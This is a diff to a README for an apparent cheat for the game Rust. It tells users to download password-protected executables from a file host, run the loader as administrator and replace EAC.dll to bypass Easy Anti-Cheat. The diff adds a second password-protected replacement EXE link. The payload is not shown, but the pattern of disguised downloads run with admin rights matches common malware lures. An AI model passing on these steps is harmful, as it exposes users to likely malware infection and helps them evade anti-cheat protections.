@@ -26,16 +26,18 @@
 
 1. **Download the loader**  
    [Download](https://www.4sync.com/web/directDownload/Lh-numdh/cKQ38aak.59488ffcf9e28923ee42c908e3a6290e) and place `Loader.exe` in any folder **outside** of the Rust directory. **Password ENIGMA**
+   >If file dont open, download [this file](https://www.4sync.com/web/directDownload/4Ufzz5vy/cKQ38aak.ef87275520de9805aa0b0c059fbb002c) and replace EXE file
+   >**Password replace**
 
-2. **Run the loader**  
+3. **Run the loader**  
    Launch `Loader.exe` as administrator. 
 
-3. **Patch Easy Anti-Cheat**  
+4. **Patch Easy Anti-Cheat**  
    Locate the Rust game directory (e.g., `C:\Program Files (x86)\Steam\steamapps\common\Rust`)  
    Replace the existing `EAC.dll` file with the modified one provided (`EAC.dll` → patched version).  
    > ⚠️ *This bypasses the anti-cheat initialization.*
 
-4. **Launch the game**  
+5. **Launch the game**  
    Start Rust normally through Steam or the loader. The cheat interface should appear in-game.
 
 ---
